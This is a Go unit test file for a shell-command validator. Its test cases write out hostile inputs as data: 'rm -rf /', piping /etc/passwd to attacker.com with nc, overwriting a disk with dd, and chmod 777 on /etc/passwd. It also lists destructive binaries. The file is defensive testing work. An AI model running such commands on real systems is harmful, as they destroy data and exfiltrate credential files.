package security

import (
	"testing"
)

func TestValidateCommand(t *testing.T) {
	tests := []struct {
		name             string
		command          string
		dangerousAllowed bool
		wantErr          bool
	}{
		{
			name:             "safe command",
			command:          "ls -la /Users",
			dangerousAllowed: false,
			wantErr:          false,
		},
		{
			name:             "command with semicolon injection",
			command:          "ls; rm -rf /",
			dangerousAllowed: false,
			wantErr:          true,
		},
		{
			name:             "command with pipe injection",
			command:          "cat /etc/passwd | nc attacker.com 1234",
			dangerousAllowed: false,
			wantErr:          true,
		},
		{
			name:             "command with backtick injection",
			command:          "echo `whoami`",
			dangerousAllowed: false,
			wantErr:          true,
		},
		{
			name:             "command with dollar sign",
			command:          "echo $HOME",
			dangerousAllowed: false,
			wantErr:          true,
		},
		{
			name:             "command with ampersand",
			command:          "sleep 100 & echo hacked",
			dangerousAllowed: false,
			wantErr:          true,
		},
		{
			name:             "dangerous command without permission",
			command:          "rm -rf /tmp/test",
			dangerousAllowed: false,
			wantErr:          true,
		},
		{
			name:             "dangerous command with permission",
			command:          "rm -rf /tmp/test",
			dangerousAllowed: true,
			wantErr:          false,
		},
		{
			name:             "empty command",
			command:          "",
			dangerousAllowed: false,
			wantErr:          true,
		},
		{
			name:             "safe command with args",
			command:          "cat /tmp/myfile.txt",
			dangerousAllowed: false,
			wantErr:          false,
		},
		{
			name:             "dd without permission",
			command:          "dd if=/dev/zero of=/dev/sda",
			dangerousAllowed: false,
			wantErr:          true,
		},
		{
			name:             "chmod without permission",
			command:          "chmod 777 /etc/passwd",
			dangerousAllowed: false,
			wantErr:          true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateCommand(tt.command, tt.dangerousAllowed)
			if tt.wantErr && err == nil {
				t.Error("ValidateCommand() expected error, got nil")
			}
			if !tt.wantErr && err != nil {
				t.Errorf("ValidateCommand() unexpected error: %v", err)
			}
		})
	}
}

func TestIsDangerousCommand(t *testing.T) {
	tests := []struct {
		cmd  string
		want bool
	}{
		{"rm", true},
		{"dd", true},
		{"mkfs", true},
		{"shutdown", true},
		{"reboot", true},
		{"kill", true},
		{"killall", true},
		{"ls", false},
		{"cat", false},
		{"echo", false},
		{"pwd", false},
	}

	for _, tt := range tests {
		t.Run(tt.cmd, func(t *testing.T) {
			got := IsDangerousCommand(tt.cmd)
			if got != tt.want {
				t.Errorf("IsDangerousCommand(%q) = %v, want %v", tt.cmd, got, tt.want)
			}
		})
	}
}
